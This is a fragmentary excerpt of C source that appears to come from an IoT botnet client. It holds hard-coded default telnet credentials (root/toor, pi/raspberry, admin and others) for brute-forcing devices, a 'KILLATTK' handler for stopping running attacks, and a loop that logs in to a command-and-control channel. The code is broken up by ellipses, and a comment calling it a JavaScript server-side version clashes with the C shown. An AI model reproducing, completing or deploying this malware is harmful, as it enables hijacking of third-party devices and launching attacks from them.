...
/*
		...
		***THIS VERSION WAS INTENDED FOR THE JAVASCRIPT SERVER SIDE ***
...
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "telnet\0", "pi\0", "cisco\0", "netgear\0", "oracle\0", "cusadmin"};
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "vizxv\0","(null)\0","telnet\0","raspberry\0","oracle\0","alpine\0","maxided\0"};
...
void processCmd(int argc, unsigned char *argv[])
{
	...
	int x;
        ...
        if(!strcmp(argv[0], "KILLATTK"))
        {
                ...
                if(killed > 0)
                {
                        sockprintf(mainCommSock, "Killed Attack On %d.", killed);
                } else {
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                int i = 0;
				int n;
				sockprintf(mainCommSock, "@login guest DarkNet");
